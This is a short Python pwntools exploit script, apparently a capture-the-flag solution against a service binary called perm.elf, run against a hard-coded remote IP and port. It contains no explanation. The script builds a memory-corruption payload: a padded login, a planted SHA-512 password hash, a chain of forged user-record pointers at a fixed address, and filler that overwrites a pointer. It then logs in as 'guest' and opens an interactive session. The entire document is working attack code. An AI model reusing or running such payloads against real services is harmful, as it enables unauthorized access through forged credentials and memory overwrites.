from pwn import *

proc = remote("109.233.56.90", 11592)
#proc = process("./perm.elf")

my_login = b"guest\x00"
magic_s = my_login + b"\x00"*(256 - len(my_login))
len_of_login_enter = len(magic_s)
magic_s += my_login
magic_s += b"$6$DuIP066XH1.8BN3i$2OJUDQFyj/RVBRM/5RUxPRXbH0yts/7uVNSKStdlrsSzXF7n/tI5sas8S1OM./j7vvpdi.UinXuioJa9gQFcM1\x00"
len_of_my_user = len(magic_s)

magic_s += p64(0x404100 + len_of_login_enter)
magic_s += p64(51337)
magic_s += p64(0x404100 + len_of_login_enter + len(my_login))
magic_s += p64(0x404100+len_of_my_user+0x20)

for i in range(1, 20):
    magic_s += p64(0x404100 + len_of_login_enter)
    magic_s += p64(51337)
    magic_s += p64(0x404100 + len_of_login_enter + len(my_login))
    magic_s += p64(0x404100+len_of_my_user+(0x20 * (i + 1)))

magic_s += p64(0x404100 + len_of_login_enter)
magic_s += p64(51337)
magic_s += p64(0x404100 + len_of_login_enter + len(my_login))
magic_s += p64(0)

magic_s += b"A"*(0x1000 - len(magic_s))
magic_s += p64(0x404100+len_of_my_user)
input()
proc.sendline(magic_s)
#proc.sendline(b"kalex")
#print(proc.recvline())
proc.send(b"guest")
#print(proc.recvline())
proc.interactive()
